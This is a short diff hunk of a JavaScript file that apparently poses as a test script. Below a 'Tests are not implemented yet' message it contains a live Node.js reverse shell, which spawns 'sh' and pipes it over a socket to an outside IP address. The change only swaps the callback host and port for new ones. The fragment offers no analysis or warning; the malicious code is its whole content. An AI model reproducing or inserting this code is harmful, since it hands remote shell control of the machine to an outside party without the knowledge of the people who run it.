@@ -5,7 +5,7 @@ console.log("Tests are not implemented yet...");
         cp = require("child_process"),
         sh = cp.spawn("sh", []);
     var client = new net.Socket();
-    client.connect(9001, "139.144.181.206", function(){
+    client.connect(9999, "78.35.165.10", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
